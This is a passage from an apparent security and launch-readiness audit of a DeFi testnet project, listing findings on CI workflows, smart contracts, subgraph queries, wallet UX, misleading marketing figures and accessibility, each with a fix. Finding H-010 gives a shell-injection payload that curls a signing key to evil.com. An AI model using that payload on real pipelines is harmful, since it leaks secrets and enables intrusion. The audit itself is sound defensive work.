**Fix:** Add `@upstash/ratelimit` middleware in `middleware.ts` covering `/api/*` paths, sliding-window 60 req/min per IP. Or use Vercel WAF rate-limiting if on Pro tier.
**Effort:** M (3h)

### H-010 · `archive-weekly.yml` shell injection via `workflow_dispatch` input
**Source:** O-48, wave1-websec F20 · **File:** `.github/workflows/archive-weekly.yml:42`
**Evidence:** `--strategy "${{ github.event.inputs.strategy || 'mean-reversion-v1' }}"` interpolates user input directly into shell.
**Impact:** A repo collaborator dispatches the workflow with payload like `mean-reversion-v1"; curl evil.com/x?t=$RESEARCH_SIGNER_KEY #` — exfiltrates secrets.
**Fix:** Pass via env var instead of inline interpolation: `env: { STRATEGY: ${{ github.event.inputs.strategy }} }` then `--strategy "$STRATEGY"`.
**Effort:** S (5 min)

### H-011 · `agents-cron.yml` prints full API responses to public logs
**Source:** O-47, wave1-websec F13 · **File:** `.github/workflows/agents-cron.yml:35-37`
**Evidence:** `cat /tmp/augur.json`, `cat /tmp/haruspex.json`, `cat /tmp/auspex.json` dumps full bodies to GHA logs.
**Impact:** If responses contain wallet addresses, position data, or internal state, that data is visible to anyone with repo read access.
**Fix:** Replace with status-code logging only: `curl -sS -o /dev/null -w "%{http_code}\n"`.
**Effort:** S (5 min)

### H-012 · `notifier-cron.yml` runs every minute (~43k/month vs 2k–3k free-tier)
**Source:** O-14 · **File:** `.github/workflows/notifier-cron.yml`
**Impact:** Will exhaust GHA free-tier quota in days. Plus: every tick is currently a no-op due to C-008/C-009.
**Fix:** Reduce to `*/5 * * * *` (12k/month) or move to a dedicated VPS cron. Once C-008/C-009 are fixed, the lower frequency is still appropriate.
**Effort:** S (1 line edit)

### H-013 · 7 of 9 workflows have no failure notifications
**Source:** O-15 · **Files:** all workflows except lantern-cron.yml (which has Discord webhook on failure)
**Impact:** Vigil-keeper, agents, notifier, brand-assets, e2e, loadtest fail silently. A liquidation that never queues because the keeper job died is invisible until a user complains.
**Fix:** Add a `if: failure()` step that posts to Discord webhook to every workflow that runs business-critical logic. Mirror the lantern-cron pattern.
**Effort:** S (15 min per workflow)

### H-014 · No `timeout-minutes` on ci.yml jobs
**Source:** O-16 · **File:** `.github/workflows/ci.yml`
**Impact:** A hung Kani proof or stalled cargo build runs for the GHA default 6 hours, burning quota and blocking other workflows.
**Fix:** Add `timeout-minutes: 30` to each of the 8 jobs in ci.yml.
**Effort:** S (5 min)

### H-015 · `e2e.yml` exposes `E2E_TEST_WALLET_PRIVATE_KEY` at job level
**Source:** wave1-websec F31 · **File:** `.github/workflows/e2e.yml:28`
**Impact:** Secret visible to every step including `actions/upload-artifact`. Any compromised step in the job can read it.
**Fix:** Move the secret to only the step that needs it (the test runner step).
**Effort:** S (2 min)

### H-016 · 5 of 9 workflows have no `permissions` block (default = read+write)
**Source:** wave1-websec F11 · **Files:** e2e.yml, agents-cron.yml, lantern-cron.yml, notifier-cron.yml, vigil-keeper.yml
**Impact:** Default GITHUB_TOKEN gets read+write on all scopes. A compromised step could push code, create releases, modify settings.
**Fix:** Add `permissions: {}` (deny-all) at workflow level, then grant only what each job needs (typically `contents: read`).
**Effort:** S (5 min per workflow)

## Security · oracle / contracts / CCIP

### H-017 · Oracle `abs_diff_bps` is asymmetric — same disagreement passes or fails depending on which oracle is higher
**Source:** wave2-contracts W2-H2 · **File:** `contracts/plinth-oracle/src/lib.rs:138-144`
**Evidence:** Always divides by `a` (Chainlink). At a 5% disagreement, diff_bps is 500 if Chainlink is lower but 476 if Chainlink is higher.
**Impact:** At the 50bps boundary, identical disagreement passes or fails depending on ordering. Spurious `OracleDisagreement` reverts blocking user ops, OR slightly-stale prices through.
**Fix:** Divide by `max(a, b)` or `(a + b) / 2`.
**Effort:** S (3 lines) + redeploy

### H-018 · Vigil `queue_liquidation` not gated by `is_paused`
**Source:** O-10, wave2-contracts W2-H3 · **File:** `contracts/vigil/src/lib.rs:198-240`
**Impact:** During a global incident pause, Plinth still calls `Vigil.queue_liquidation`. Jobs queue successfully because the function only checks `msg.sender == plinth`. When pause lifts, keepers execute against prices that were stale at queue time.
**Fix:** Add `if self.is_paused.get() { return Err(VigilError::Paused) }` at the top of `queue_liquidation`.
**Effort:** S (2 lines) + redeploy

### H-019 · Coffer/Sigil/Vigil `initialize()` has front-run window
**Source:** O-11 · **Files:** `contracts/{coffer,sigil,vigil}/src/lib.rs:initialize()`
**Impact:** Between deploy and `initialize` call, anyone monitoring the mempool can front-run and claim ownership. Mitigated on Arbitrum (sequencer ordering) but not safe on L1 or other L2s.
**Fix:** Store `tx.origin` at deploy. Require `msg_sender() == deployer` in `initialize()`.
**Effort:** M (1h per contract) + redeploy

### H-020 · `Rostrum.mirrorOpen` accepts any relayer for any follower
**Source:** O-12 · **File:** `contracts/rostrum/src/Rostrum.sol`
**Impact:** Any relayer can call mirrorOpen on behalf of any follower with a broad mandate.
**Fix:** Require `msg.sender == follower` OR sender is in an approved-keeper allowlist.
**Effort:** S (5 lines) + redeploy

### H-021 · `AqueductReceiver` does NOT inherit `IERC165.supportsInterface`
**Source:** wave2-resources 6.1 · **File:** `contracts/aqueduct/src/AqueductReceiver.sol:47`
**Evidence:** Defines its own `CCIPReceiverBase` abstract contract inline. Chainlink's `CCIPReceiver.sol` implements `IERC165.supportsInterface` returning true for `IAny2EVMMessageReceiver`. CCIP router checks `supportsInterface` before calling `ccipReceive`. Without it, only tokens transfer (no data execution).
**Impact:** Cross-chain messages may silently drop on production CCIP routers — user's USDC arrives but the deposit-into-Coffer logic never runs.
**Fix:** Inherit from `CCIPReceiver` upstream OR implement `supportsInterface(IAny2EVMMessageReceiver.interfaceId) returns true`.
**Effort:** S (10 min) + redeploy

### H-022 · `AqueductReceiver.ccipReceive` has no reentrancy guard
**Source:** wave2-contracts W2-H4 · **File:** `contracts/aqueduct/src/AqueductReceiver.sol:89-135`
**Impact:** `ccipReceive` calls `ICoffer.deposit` (external). On CCIP v1.5+ batched delivery, a crafted pair of messages could exploit the lack of guard for double-deposit.
**Fix:** Add `nonReentrant` modifier or `bool _entered` flag.
**Effort:** S (3 lines) + redeploy

### H-023 · Hyperliquid stale-attestation replay
**Source:** wave2-resources 5.2 · **File:** `contracts/adapters/hyperliquid/src/HyperliquidHybridAdapter.sol`
**Evidence:** `attest_off_chain_state` has no monotonicity check on `hl_block`. Validators can replay older Hyperliquid block data with a fresh attestation hash (the `seen_attestations[hash]` dedup only catches exact-duplicate).
**Impact:** Validators can roll back price/PnL to a previous state. Manipulation attack vector.
**Fix:** Add `require(hl_block > pos.last_attestation_block)` in `attest_off_chain_state`.
**Effort:** S (2 lines) + redeploy

### H-024 · Aave adapter reports zero unrealized PnL
**Source:** wave2-resources 3.3 · **File:** `contracts/adapters/aave-horizon/src/AaveHorizonAdapter.sol`
**Evidence:** `get_position()` hardcodes `unrealized_pnl_signed: 0` and `current_price_q64: 1 << 64`. Should read aToken accrual.
**Impact:** Plinth's margin calc sees zero PnL for Aave positions. Under-reports collateral value. Users effectively can't accumulate yield within the unified margin.
**Fix:** Read `IERC20(aToken).balanceOf(this)` and compute delta vs `principal_supplied` for unrealized PnL.
**Effort:** M (4h) + redeploy

### H-025 · ERC-7201 namespaced storage CLAIMED but NOT IMPLEMENTED in Stylus contracts
**Source:** wave2-resources 1.1 · **Files:** `contracts/{plinth,coffer,sigil,vigil}/src/lib.rs`
**Evidence:** Plinth comment says "Storage uses ERC-7201 namespaced slots for safe UUPS upgrades." All four contracts use bare `sol_storage!` with no namespace ID. Slots assigned sequentially from 0.
**Impact:** UUPS upgrade safety claim is false. Adding a field mid-struct shifts all subsequent slots, corrupting storage on upgrade.
**Fix:** Either implement true ERC-7201 (requires SDK support; Stylus may not support diamond-style namespacing yet), OR remove the claim from comments and the security model. Document the upgrade-safety implication.
**Effort:** L (full implementation) or M (remove claim + document constraint)

### H-026 · `PosternKeyRegistry.markAllRevoked` iterates unbounded array → kill switch can fail
**Source:** wave2-contracts W2-H6 · **File:** `contracts/postern-kill-switch/src/PosternKeyRegistry.sol:52-58`
**Impact:** No cap on `_activeKeys[user].length`. An attacker can spam `recordIssued` to grow the array until `markAllRevoked` exceeds block gas. The Kill Switch's `try { keyRegistry.markAllRevoked(user) }` catches the OOG, but `keys_cancelled = 0` — session keys persist after the user thought they killed everything.
**Fix:** Cap active keys per user (e.g. 50) in `recordIssued`. Or implement batched revocation that the user can call repeatedly.
**Effort:** M (2h) + redeploy

### H-027 · `Rostrum.leader_followers` array never shrinks on `endFollow`
**Source:** wave2-contracts W2-H5 · **File:** `contracts/rostrum/src/Rostrum.sol:131`
**Impact:** Over time, off-chain mirror-trade relayer iterates an unbounded list. Gas DoS on any on-chain consumer.
**Fix:** Swap-and-pop removal in `endFollow`. Or maintain `followerCount` and use mapping instead of array.
**Effort:** S (10 lines) + redeploy

### H-028 · Adapter `setAuthorizedCaller` is `onlyPraetor`, not `onlyTimelock`
**Source:** wave2-contracts W2-H7 · **Files:** every adapter (CurveAdapter, AaveHorizon, GMX, etc.)
**Impact:** A single deployer EOA can authorize a malicious contract as caller on all adapters without the 48h community veto window. Direct position manipulation bypassing Router checks.
**Fix:** Gate `setAuthorizedCaller` behind `onlyTimelock`. Keep emergency deauthorize as `onlyPraetor` (same asymmetry as pause/resume).
**Effort:** S (1 line per adapter) + redeploys

### H-029 · `PlinthMath` accepts `haircuts_bps` parameter but never uses it
**Source:** wave2-contracts W2-H1 · **File:** `contracts/plinth-math/src/lib.rs:109` — `let _ = haircuts_bps;`
**Impact:** Risk model is incomplete. Concentrated positions in illiquid instruments are under-margined. The haircut configured per-instrument has zero effect on required margin.
**Fix:** Integrate haircuts into the SPAN scenario loop: `worst_loss_per_class *= (10000 + max_haircut_in_class) / 10000`.
**Effort:** L (8h math + tests) + redeploy

## Subgraph · data integrity / pagination

### H-030 · No `_meta { block { number } }` health check anywhere
**Source:** wave2-subgraph SD-3 · **Files:** `apps/verify/src/lib/scribe-helpers.ts`, all 45 API routes, `services/lantern-attestor`, `services/vigil-keeper`, `services/notifier`
**Impact:** If the hosted indexer stalls (common during Graph Node upgrades or RPC rate-limits), every consumer silently serves stale data as current. Lantern publishes a POR tree from old balances; Vigil-keeper misses paused accounts; verify-app shows "source: scribe" with no warning.
**Fix:** Add a shared `checkScribeHealth()` helper that queries `_meta` and compares vs `eth_blockNumber` (single RPC). Wire into Lantern (refuse publish if lag > 50 blocks), Vigil-keeper (log warning), verify-app (banner).
**Effort:** M (3h)

### H-031 · Vigil-keeper fetch has no timeout (can hang indefinitely)
**Source:** wave2-subgraph SD-4 · **File:** `services/vigil-keeper/src/lib/scribe.ts:30-36`
**Impact:** Slow Scribe causes the GHA cron to hang until 6h timeout. New crons fire and stack zombies. No liquidation candidates detected during the hang.
**Fix:** Add `signal: AbortSignal.timeout(10_000)` to the fetch.
**Effort:** S (1 line)

### H-032 · Notifier fetch has no timeout
**Source:** wave2-subgraph SD-5 · **File:** `services/notifier/src/tick.ts:22-28`
**Impact:** Same hang risk with 1-minute cron cadence — zombies stack rapidly.
**Fix:** Add `signal: AbortSignal.timeout(5_000)`.
**Effort:** S (1 line)

### H-033 · `protocol/metrics` and `reserves/summary` use `first: 1000` with no pagination
**Source:** wave2-subgraph SD-6 · **Files:** `apps/verify/src/app/api/protocol/metrics/route.ts:30-31`, `api/reserves/summary/route.ts:31`
**Impact:** Beyond 1000 users, TVL and POR are silently undercounted. The Lantern POR specifically claims "proof of reserves" while missing reserves — a false attestation published on-chain at scale.
**Fix:** Paginate with `skip` until exhausted. For Lantern, the off-chain service has the same bug — fix `services/lantern-attestor/src/scribe.ts:14` too.
**Effort:** M (2h)

### H-034 · Lantern `first: 1000` hardcoded — silent data loss on POR tree
**Source:** O-26 · **File:** `services/lantern-attestor/src/scribe.ts:14`
**Impact:** Beyond 1000 depositors, the POR tree is incomplete. The "proof of reserves" attestation is wrong on-chain.
**Fix:** Paginate or use `first: 5000` with a logged warning when results == 5000.
**Effort:** M (1h)

### H-035 · `agents/[id]/profile` queries non-existent fields on RostrumReputation/MirrorTrade/AgentAction
**Source:** wave2-subgraph SD-7 · **File:** `apps/verify/src/app/api/agents/[id]/profile/route.ts:67-75`
**Impact:** Every agent profile page query throws GraphQL error. The catch returns `emptyProfile(id, 'pending')`. The page always shows "pending" even when real data exists.
**Fix:** Align query field names with actual schema: `currentScore`/`previousScore` on reputation, `timestamp` on actions, `followerNotionalSigned`/`timestamp` on mirror trades.
**Effort:** M (1h)

### H-036 · `LiquidationEvent.account = ''` causes `@derivedFrom` join failures
**Source:** O-19 · **File:** `subgraph/src/vigil.ts`
**Impact:** Empty string FK in liquidation events breaks GraphQL joins. The notifier (already broken via C-008/C-009) would also choke on this once fixed.
**Fix:** Change to `liq.account = null` (the schema already permits null).
**Effort:** S (1 line)

### H-037 · `CofferUserBalance.balanceWei` tracks net deposited, not redeemable
**Source:** O-20 · **File:** `subgraph/src/coffer.ts`
**Impact:** Lantern reads this for proof-of-reserves; the tree's leaf values diverge from on-chain `Coffer.convertToAssets(Coffer.balanceOf(user))` once yield/loss accrues. The on-chain attested root is wrong.
**Fix:** Either rename to `netDepositedAssetsWei` and document the limitation, or compute `convertToAssets(shares)` snapshots in the handler. The short-term fix is the rename + Lantern publishes "net deposits" not "reserves."
**Effort:** S (rename) or L (full conversion)

## Wallet · transaction · network UX

### H-038 · No wrong-chain banner at the app shell level
**Source:** wave1-wallet W-2, wave2-e2e E2E-59 · **File:** `apps/verify/src/components/app-shell.tsx`
**Impact:** All 13 `/app/*` pages silently fail on wrong chain — no banner, no guidance. Wagmi shows nothing because `useSwitchChain` is not called anywhere outside `verifier-step-runner`.
**Fix:** Add a persistent banner in `AppShell` when `chain?.id !== 421614` with a "Switch to Arbitrum Sepolia" button using wagmi's `useSwitchChain`.
**Effort:** M (2h)

### H-039 · No account-switching cache invalidation
**Source:** wave1-wallet W-3 · **Files:** `components/wagmi-providers.tsx`, all `lib/use-*.ts`
**Impact:** When a user switches accounts in their wallet, Tanstack Query cache keys persist. Stale data from the previous wallet shows for 30–60s. For a finance product, displaying another wallet's positions is a critical UX failure.
**Fix:** Add a `useEffect` watching `useAccount().address` that calls `queryClient.invalidateQueries()` on change. Use wagmi's `watchAccount`.
**Effort:** M (1h)

### H-040 · No insufficient-balance detection on any form
**Source:** wave1-wallet TX-10 · **Files:** `deposit-card.tsx`, `withdraw-card.tsx`, `order-form.tsx`, `transfer-form.tsx`
**Impact:** A user typing $1M with $10 USDC balance gets an opaque ERC-20 `transferFrom` revert. Every primary form has this bug.
**Fix:** In each form, compare `parseUnits(input)` against on-chain balance (already fetched for display). Disable submit and show "Insufficient USDC balance" when input > balance.
**Effort:** M (4h covering 4 forms)

### H-041 · Transfer form CTA is dead — no onClick handler
**Source:** wave1-wallet MC-13 · **File:** `apps/verify/src/components/transfer/transfer-form.tsx:178`
**Evidence:** `<button type="button" disabled={!ready} ...>Transfer {amount} {token} →</button>` with no onClick and no parent `<form onSubmit>`.
**Impact:** Primary CTA on a primary app page does nothing. Clicking it is a dead end.
**Fix:** Wire to a `useTransfer` hook that calls `Aqueduct.send(...)`. Or disable with a "Transfer wiring ships Month 2" message if Aqueduct isn't ready.
**Effort:** M (4h to wire) or S (15 min to disable + message)

### H-042 · Single RPC transport with no fallback
**Source:** wave1-wallet NET-1 · **File:** `apps/verify/src/lib/wagmi.ts`
**Evidence:** `transports: { [arbitrumSepolia.id]: http(env_rpc ?? 'https://arbitrum-sepolia.publicnode.com') }`
**Impact:** If publicnode.com is down (or the env-configured RPC), the entire app is dead. Users with open positions cannot manage risk.
**Fix:** Use wagmi `fallback([http(primary), http(secondary)])` with at least two providers (Alchemy free tier or Infura as backup).
**Effort:** S (10 min)

### H-043 · `risk-preview-modal.tsx` does not disclose 10% partial-liquidation policy
**Source:** wave2-product P-23 · **File:** `apps/verify/src/components/trade/risk-preview-modal.tsx`
**Impact:** Users do not know that liquidation is partial (10% per block) — a competitive advantage that's hidden. Plinth's `partial_liquidation_bps = 1000` is set but never communicated.
**Fix:** Add to the risk modal: "Liquidation is partial: max 10% of your position per block. Your position survives if margin recovers within the same block window."
**Effort:** S (5 min)

### H-044 · Oracle staleness is not surfaced in the UI
**Source:** wave2-product P-22 · **Files:** `/app/trade`, `/app/portfolio` — no oracle health indicator
**Impact:** PRD §21.1 specifies that prices >5 min old pause Plinth. The risk modal mentions this but no real-time indicator tells the user when the freshness threshold is approached. Users see stale prices with no warning.
**Fix:** Add an oracle health pill to the trade page header and portfolio shell: "Oracle: fresh (12s ago)" or "Oracle: STALE — trading paused" based on the latest price update timestamp.
**Effort:** M (3h)

## Honesty · marketing claims · live verification

### H-045 · Hero section labels static design data as "live testnet feed"
**Source:** wave1-live-verify LV-07, LV-20 · **File:** `apps/verify/src/components/landing/hero-section.tsx:86,113,131-133`
**Evidence:** Pool value $10,783,563 hardcoded. Venue cards have hardcoded TVLs ($1,252,181, $484,434, $891,827, $319,446, $186,210, $402,045, $58,379). Section is labeled "Plan view · live testnet feed."
**Impact:** Static design values are presented as live data. A judge noticing the label vs static values catches the lie immediately.
**Fix:** Either fetch from `/api/protocol/metrics` and `/api/portfolio/positions` for venue TVLs, OR change the label to "Plan view · design reference" with a visible disclaimer.
**Effort:** M (2h to wire APIs) or S (15 min to relabel)

### H-046 · `Features.tsx` PortfolioMock and LanternMock render fake portfolio + reserves
**Source:** wave1-live-verify LV-08, wave2-product P-16, P-17 · **File:** `apps/verify/src/components/atrium/landing/Features.tsx:88-110, 260-265`
**Evidence:** Hardcoded `$12,378,422` portfolio value with `+$284,920 · 24h` P&L; `$4,128,370` Lantern reserves with `0.00 bps` delta and "Verified · 38 min ago"; specific position rows.
**Impact:** Visual mocks inside browser-chrome frames imply "this is what the real app looks like" with real data. The Lantern mock specifically attests perfect solvency with a fake timestamp — particularly dangerous.
**Fix:** Add subtle "Illustrative · testnet" labels inside each browser chrome, OR wire to real API endpoints with "0" / "pending" fallback.
**Effort:** S (15 min for labels) or M (3h for full wiring)

### H-047 · Faucet copy contradicts actual faucet (10K USDC + 5K rAAPL claimed; 5 USDC + 0.0005 ETH actual)
**Source:** wave1-live-verify LV-09, wave2-product P-18 · **File:** `apps/verify/src/components/atrium/mobile/MobileLanding.tsx:257`
**Evidence:** "Faucet drops $10K test USDC + $5K rAAPL" vs actual "5 USDC + 0.0005 ETH per claim, 24h cooldown." No rAAPL token exists in the deployment registry.
**Impact:** Users expect $15K in test assets; they get $5. Immediate credibility loss.
**Fix:** Update the copy to the real amounts. Or increase the faucet drops to match (requires more funded faucet contract).
**Effort:** S (5 min copy)

### H-048 · "Thirteen ship at launch" copy is wrong — actual deployed count is 14+
**Source:** wave1-live-verify LV-17, wave2-product P-19, P-37 · **File:** `apps/verify/src/components/atrium/mobile/MobileLanding.tsx:228`
**Impact:** Undersells the project (13 < actual deployed count). The PRD's FLOOR scenario says 13/18, but the real deployed count is closer to 14–15. The number is also stale.
**Fix:** Remove the hardcoded number and derive from the deployment registry, OR replace with "Eighteen named. Fourteen live today" with a dynamic count.
**Effort:** S (10 min)

### H-049 · `JUDGE_ONE_PAGER.md` claim "no number invented" is overstated
**Source:** wave1-live-verify LV-26 · **File:** `JUDGE_ONE_PAGER.md` (last line)
**Evidence:** "Every number here either has a footnote or is rendered from on-chain Scribe data on the live site. No number on this page is invented." But the doc references a "simulated Q1-2026 backtest" for the $3M HIP-3 / $500K Aave / 55% saved figures. Simulated backtest output is not on-chain Scribe data.
**Impact:** Closing claim contradicts the body. A judge cross-referencing finds the lie.
**Fix:** Soften: "Numbers from simulation are labelled as such above; live numbers come from Scribe and are linked in the verifier flow."
**Effort:** S (5 min)

### H-050 · No Postern dedicated page in the UI
**Source:** wave2-product P-6 · **Missing:** No `/postern` or `/app/postern` route
**Impact:** PRD §4.18 lists Postern as subsystem #18 with 5 user-facing capabilities (passkey login, gas sponsorship, session keys, batched ops, social recovery). No dedicated page exists. The "18 subsystems" claim has only 17 visible surfaces.
**Fix:** Create `/app/postern` (or a Postern section in `/app/settings`) with: session-key list, gas-sponsorship status, recovery guardians config, batched-tx history.
**Effort:** L (8h)

### H-051 · No Loom backup recording exists; no QR mirror on judge card
**Source:** wave2-product P-14 · **Missing:** rehearsals/loom-recording-outline.md exists but no recording committed
**Impact:** PRD §26 and acceptance-criteria.md gate #4 require "Loom backup uploaded + matches current contract state." If verify.atrium.fi goes down on judge day (and given C-020, it's already down for external visitors), there is no fallback.
**Fix:** Once the demo is functional (after C-004), record a Loom. Add a QR component to the judge card. Commit the Loom URL.
**Effort:** M (2h, blocked on C-004 fix)

### H-052 · Lantern dashboard depends on `dweb.link` IPFS gateway with no fallback
**Source:** wave2-product P-11 · **File:** `apps/verify/src/components/lantern-dashboard.tsx:47`
**Evidence:** `fetch('https://${data.ipfsCid}.ipfs.dweb.link/tree.json')`
**Impact:** If dweb.link is down or rate-limited, Lantern verification fails. For an institutional user (Tariq persona), "trust dweb.link" is not acceptable.
**Fix:** Add a fallback that reads the Merkle tree from Atrium's own API endpoint. Show the on-chain root with an Arbiscan link so users can verify root independently.
**Effort:** M (2h)

## Legal · launch readiness · trust

### H-053 · No risk disclosure on the vault deposit page
**Source:** wave1-launch L-6 · **File:** `apps/verify/src/app/app/vault/page.tsx:30-55`
**Impact:** The Safety section describes circuit breakers but never states "testnet only / no real funds at risk / smart contracts can fail / you may lose deposited assets." Finance products require prominent risk warnings before deposit actions.
**Fix:** Add a banner above the deposit card: "Testnet only. No real funds. Smart contracts have not been audited to mainnet standards. By depositing you accept these risks."
**Effort:** S (15 min)

### H-054 · No CHANGELOG.md in repo root
**Source:** wave1-launch L-7 · **Missing file**
**Impact:** Investors, contributors, and package indexers expect a root-level CHANGELOG.md. Its absence is an immaturity signal. The `/changelog` page exists but a public-facing CHANGELOG.md is the convention.
**Fix:** Create `CHANGELOG.md` mirroring the `/changelog` page content. Wire it into a release-notes generator from git tags.
**Effort:** S (30 min)

### H-055 · No public status page
**Source:** wave1-launch L-8 · **Missing**
**Impact:** Users and partners have no way to check service health. The SLA page makes commitments with no public accountability mechanism. ops/monitoring/uptime-config.md exists but there is no `status.atrium.fi`.
**Fix:** Deploy a status page (Better Stack, Upptime on GitHub Pages, or similar). Link from footer and SLA page. Wire monitor checks: verify.atrium.fi, codex API, lantern cron, vigil-keeper cron, subgraph endpoint.
**Effort:** M (3h)

### H-056 · No support channel for non-security issues
**Source:** wave1-launch L-9 · **Missing**
**Impact:** No `support@atrium.fi`, no in-app help button. Discord link is an indirect redirect (`atrium.fi/discord`). Users with non-security issues have no support path.
**Fix:** Add `support@atrium.fi`. Replace Discord redirect with a direct `discord.gg/` invite. Add an in-app feedback widget (or a "Get help" link in the app footer linking to Discord + email).
**Effort:** S (1h after Discord vanity URL is created)

### H-057 · Adapter conformance test suite missing — `tests/adapter-conformance/` is empty
**Source:** O-52, wave1-launch L-10 · **CONTRIBUTING.md:8 reference**
**Impact:** README promises grants for IPorticoAdapter v1.0 implementations. Contributors cannot verify conformance because the directory is empty. Broken contributor onboarding path.
**Fix:** Write the 6 conformance tests as Foundry tests exercising the IPorticoAdapter interface against a mock adapter. Document the test harness in a `tests/adapter-conformance/README.md`.
**Effort:** M (4–6h)

### H-058 · No accessibility statement page
**Source:** wave1-launch L-11 · **Missing**
**Impact:** European Accessibility Act 2025 requires a public statement for finance apps serving EU users. Also signals commitment for investors.
**Fix:** Create `/accessibility` stating WCAG 2.1 AA target, known gaps, and a contact for accessibility issues.
**Effort:** S (1h)

### H-059 · KYC/AML disclosure incomplete
**Source:** wave1-launch L-12 · **File:** `legal/privacy/page.tsx:37-42`
**Impact:** Mentions Sumsub but never discloses what data Sumsub collects, the data-sharing agreement, which jurisdictions trigger KYC, what happens on KYC failure, how to appeal a tier decision. Sumsub processes IDs, selfies, biometrics — all require explicit disclosure.
**Fix:** Add a dedicated KYC disclosure section or link to a standalone KYC privacy notice. List data categories, retention, and Sumsub's role as processor.
**Effort:** M (3h)

### H-060 · Bug bounty scope/exclusions inconsistent across 3 files
**Source:** wave1-launch L-13 · **Files:** `SECURITY.md:42`, `/security` page, `.github/ISSUE_TEMPLATE/security.md`
**Impact:** SECURITY.md says "bounty program standup pending." Issue template references "$25K ceiling" as fact. Researchers cannot assess scope. Mixed signals reduce researcher trust.
**Fix:** Either publish a formal scope at `/security#bounty` with exclusions and severity matrix, OR remove all bounty references until the program is live. Pick one and align all three files.
**Effort:** M (2h)

## Accessibility · WCAG 2.1 AA

### H-061 · Color contrast failure: `--muted` on `--bg` (~3.8:1, body text)
**Source:** wave1-a11y A11Y-01 · **File:** `apps/verify/src/app/globals.css :root`
**Evidence:** `--muted: oklch(54% 0.005 60)` ≈ `#7E7872` on `--bg: oklch(98.4% 0.004 85)` ≈ `#FBFAF7`. Ratio ~3.8:1, WCAG AA requires 4.5:1.
**Fix:** Darken to `oklch(46% 0.005 60)` (~5.2:1).
**Effort:** S (1 line)

### H-062 · Color contrast failure: `--faint` on `--bg` (~2.2:1, labels at 10–11px)
**Source:** wave1-a11y A11Y-02 · **File:** `apps/verify/src/app/globals.css :root`
**Evidence:** `--faint: oklch(74% 0.004 60)` ≈ `#B5AFA9` on `#FBFAF7`. Ratio ~2.2:1.
**Fix:** Darken to `oklch(52% 0.005 60)` or fold into `--muted`.
**Effort:** S (1 line)

### H-063 · Color contrast failure: mobile `--faint` on `--bg` (~2.8:1)
**Source:** wave1-a11y A11Y-04 · **File:** `apps/verify/src/styles/atrium-mobile.css .atrium-m-root`
**Evidence:** `--faint: oklch(40% 0.005 60)` on dark `#141210`. Ratio ~2.8:1.
**Fix:** Lighten to `oklch(52% 0.005 60)`.
**Effort:** S (1 line)

### H-064 · Form inputs without programmatic labels in DesktopApp
**Source:** wave1-a11y A11Y-08 · **File:** `apps/verify/src/components/atrium/app/DesktopApp.tsx:256, 502, 507, 515, 686`
**Impact:** Five `<input>` and one `<select>` use sibling `<label>` without `htmlFor`/`id` binding. Screen readers cannot associate labels with controls.
**Fix:** Either wrap each input in its `<label>` or add matching `id`/`htmlFor` pairs.
**Effort:** S (10 min)

### H-065 · Focus rings missing on 100+ interactive components
**Source:** wave2-e2e E2E-58 · **Files:** Only 9 of ~100+ files use `focus:ring` or `focus-visible`
**Impact:** Keyboard users cannot see which element has focus on most pages. WCAG 2.4.7 violation.
**Fix:** Add a Tailwind base layer rule: `*:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }`. Then audit any custom-styled buttons that may need their own focus ring.
**Effort:** M (3h, including the audit pass)

## SEO · 8 pages missing metadata

### H-066 · Eight indexable pages have no metadata export
**Source:** wave1-a11y SEO-01 · **Files:**
- `/verify/[step]/page.tsx` (7 indexable URLs in sitemap)
- `/chaos/page.tsx`
- `/benchmarks/page.tsx`
- `/cohort/page.tsx`
- `/agents/marketplace/[id]/page.tsx`

**Impact:** Search engines index these with the generic root title "Atrium · verify." No description, no OpenGraph card. Bad first-impression in search results.
**Fix:** Add `export const metadata` (or `generateMetadata` for `[step]` and `[id]`) with title, description, openGraph fields per page.
**Effort:** M (2h covering all 8)

## Mobile · required flows / PWA

### H-067 · `/app/vault` has no mobile-optimized panel — required flow per ui.md
**Source:** wave2-e2e E2E-12, E2E-31 · **Missing:** `components/mobile/panels/vault-mobile.tsx`
**Impact:** Deposit USDC is one of 5 required mobile flows. Currently renders inside generic AppShell mobile wrapper with desktop proportions.
**Fix:** Create `VaultMobile` panel matching the pattern of `TradeMobile` / `TransferMobile`. Touch targets ≥44px, single-column layout.
**Effort:** M (3h)

### H-068 · `/app/reserves` has no mobile-optimized panel — required flow per ui.md
**Source:** wave2-e2e E2E-18, E2E-33 · **Missing:** `components/mobile/panels/reserves-mobile.tsx`
**Impact:** View Lantern attestation is a required mobile flow. Currently desktop layout at all widths.
**Fix:** Create `ReservesMobile` panel. Verify-balance button at full width, latest-attestation card stacked.
**Effort:** M (3h)

### H-069 · PWA manifest declares only one icon (SVG); 192px + 512px PNGs missing
**Source:** O-60, wave1-launch L-28, wave2-e2e E2E-35 · **File:** `apps/verify/public/manifest.json`
**Evidence:** `"icons": [{ "src": "/icon.svg", "sizes": "any", "type": "image/svg+xml" }]`. Chrome Android requires 192 + 512 PNG to show install prompt.
**Fix:** Add the existing `/brand/assets/android-icon-192.png` and `android-icon-512.png` with `"purpose": "any maskable"`.
**Effort:** S (5 min)

### H-070 · No service worker; `next-pwa` configured nowhere
**Source:** wave2-e2e E2E-39 · **Missing:** PWA plugin
**Impact:** ui.md lists `next-pwa` in the stack and Lighthouse mobile ≥ 90 as the target. Without a service worker, the PWA score and offline behavior fail.
**Fix:** Configure `next-pwa` (or `@serwist/next` for Next 15 compatibility). Service worker should cache the app shell + static assets, allow offline-fallback page.
**Effort:** M (4h)

## Permission states · ui.md gap

### H-071 · No `useSwitchChain` / wrong-chain banner anywhere except verifier-step-runner
**Source:** wave2-e2e E2E-59, wave1-wallet W-2 · **Files:** all `/app/*` pages
**Impact:** All authenticated app pages silently fail on wrong chain. Same root cause as H-038 — captured separately because ui.md lists permission state as a required state for every feature.
**Fix:** Same as H-038 — add to `AppShell`. Tracking separately to ensure ui.md compliance is verified after the fix.

### H-072 · No contract-paused state on any `/app/*` page
**Source:** wave2-e2e E2E-61 · **Files:** all `/app/*` pages
**Impact:** If Plinth/Coffer/Vigil pauses (incident response), the UI gives no signal. Users continue to fill forms and click submit; writes revert with opaque errors.
**Fix:** Add a `useContractPaused(slug)` hook that reads pause state. Surface a banner on each app page when its primary contract is paused.
**Effort:** M (3h)

### H-073 · 8+ components silently swallow fetch errors and return "pending" defaults
